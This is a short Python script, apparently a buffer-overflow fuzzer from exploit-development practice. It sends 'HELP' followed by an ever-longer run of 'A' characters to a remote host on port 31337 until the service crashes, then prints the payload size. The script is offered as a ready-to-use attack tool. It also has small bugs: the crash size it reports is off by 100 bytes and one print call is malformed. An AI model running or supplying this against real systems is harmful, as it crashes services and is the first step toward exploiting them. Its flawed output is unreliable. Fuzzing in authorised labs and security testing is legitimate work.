#!/usr/bin/python
import sys,socket,time
from termcolor import colored

cmd = "HELP" # Change this as needed
pay = "A" * 100 # Change this as needed
ip = "<RHOST>" # Change this as needed
port = 31337 # Change this as needed


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip,port))
		print(colored("[+] Sending %s bytes" % str(len(pay)), "green"))
		s.send(cmd+pay+"\r\n")
		pay += "A" * 100
		s.recv(1024)
		s.close()
	except socket.error:
		print(colored("[+] Crash detected at %s bytes" % str(len(pay)), "red"))
		sys.exit()
	except KeyboardInterrupt:
		print(colored("[*] Exiting...", "red"))
		sys.exit()
	except:
		print("[-] Could not connect to host: %s", ip)
		sys.exit()